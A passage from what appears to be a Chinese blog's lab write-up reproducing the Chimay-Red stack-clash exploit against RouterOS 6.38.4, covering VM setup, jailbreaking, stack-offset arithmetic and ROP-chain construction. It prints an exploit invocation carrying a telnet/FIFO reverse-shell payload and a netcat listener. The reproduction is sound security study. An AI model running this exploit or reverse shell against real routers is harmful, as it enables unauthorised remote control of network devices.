然后，创建两个socket，从exp的角度看是创建两个socket，但从ROS的角度看则是创建了两个线程：\ndef makeSocket(ip, port):\rs = socket.socket()\rtry:\rs.connect((ip, port))\rexcept:\rprint(\u0026#34;Error connecting to socket\u0026#34;)\rsys.exit(-1)\rprint(\u0026#34;Connected\u0026#34;)\rtime.sleep(0.5)\rreturn s\rs1 = makeSocket(ip, port) # socket 1, thread A\rs2 = makeSocket(ip, port) # socket 2, thread B 第二步 **注：**第二步是最为复杂的一步，因为我们需要计算t2的read函数的ret偏移量。这里截图中的地址和上面的截图可能不同，但步骤是连贯的\n第二步将t1的栈抬至t2中，将t1的栈抬至t2很简单，但是要抬多高呢，抬到什么程度呢。\n让我们来分析一下，我们将t1抬至t2的目的是为了覆盖t2的read函数的返回值，那么久意味着我们至少要抬0x20000个字节，因为t1和t2栈的差值就是0x20000。随后还有0x1000的保护区，故至少要抬0x21000个字节。随后我们再给0x8000字节大小留给ROP链。故最后的值位0x29000。\n现在我们知道t1的栈需要抬0x29000个字节，那么为了保证我们的ROP链可以正好覆盖到t2的read函数返回值，那么我们应该将t2的栈抬多高呢？\n上面说到，我们将t1抬至t2，抬了0x29000个字节。但是我们可以计算出t1和t2的栈差值是0x20000，所以其实我们还有0x9000个字节可以拿来让t2抬栈。那么抬多少呢？这里exp上面写的是让t2抬0x8000个字节，这里抬0x8000并不是一个固定的数值，事实上t2抬的栈只要大于发送过去的ROP链的大小，就可行。这里我还是选择跟随exp抬0x8000个字节，因为如果更换了大小，后面的ret偏移量就要重新计算。\n抬栈之后我们就可以看到，两个线程的栈顶就只剩下了0x1000字节：\n根据上面的介绍，我们知道要覆盖的是t2的read函数的ret值，故t1的栈高于t2的栈。那么这时候t2的read函数的ret值，会放在哪个地方呢？\n在漏洞代码分析的最后，我们提到了ret会放在哪个位置，那么在这里，ret的位置则会在（t2刚抬栈时的栈顶-0x14)的位置，也就是0x77D2C15C\n现在知道了ret的地址，那么这个地址就是我们ROP的起始位置，可是这个地址距离t1的写入字符串地址还有一定的距离。对于这段距离，我们就使用无意义的字符进行填充就好了，具体的填充个数为：0x77D2C15C-0x77D2B170=0xFEC\n第三步 触发t2的read函数，将其ret放入栈中，这里其实只需要我们将t2挂着等待（保持socket2连接不中断）就行，因为read函数存在阻塞，只要连接不中断，read函数就不会结束。\n**注：**s2只用发送包头，不要发送数据，否则容易把s1发送的ROP给覆盖掉。\n第四步 首先s1发送padding，因为read函数的阻塞，所以t1会读取padding，但不会退出。这时t2已经进入read函数被阻塞住了，故再次让s1发送ROP，即可覆盖t2的read函数的返回值。\n覆盖前：\n覆盖后：\n**注：**图片中的地址和计算偏移的截图中的地址不一样，原因是因为上面截图花费了大量的时间导致socket中的字符串失效，故read函数无法写入字符串。\n第五步 关闭s2的连接，刚刚t2被read函数阻塞住了，我们这边关闭s2的连接，让read函数继续运行，当read函数运行结束时，就会返回我们ROP所指向的地址。\nROP解析 上面说到了怎么覆盖掉t2的read函数的ret。覆盖掉ret后，就是如何构造ROP了。通过观察exp，我们可以看到其实exp也是选择了非常实用的使用strncpy函数，将所需要的字符串都复制到一个我们能控制的位置，随后调用dlsym函数，寻找system函数的地址，最后再将cmd的地址放入system函数\n","permalink":"http://jellyfish-pro.github.io/vuln/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/","summary":"RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。\n漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。\n首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像\n这里我选择的是 RouterOS 6.38.4\n然后使用VMware模拟，这里我们指出几个需要注意的点：\n这里可以选择Linux 3.x 内核。\n随后创建完成虚拟机后，需要修改虚拟机配置：\n这里需要将 硬盘(SCSI)改为IDE\n随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入'a'选择所有，然后输入'i'进行安装，然后根据提示一直按 'y'就可以：\n安装好后使用 admin：''登录RouterOS。\n然后输入setup命令，根据提示设置ip地址\n最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。\nRouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。\n这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。\n使用方法也很简单：\n#git clone https://github.com/0ki/mikrotik-tools.git\r#cd mikrotik-tools\r#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。\n**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。\n出现截图中的语句则表示越狱成功。\n接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:'')\nRouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.\n**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)\n首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：\n#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：\n#nc -lnvp 8080 然后使用exp，执行命令：\n#./StackClash_x86.py 192.168.113.129 80 www_binary \u0026#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1\u0026#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。","title":""}]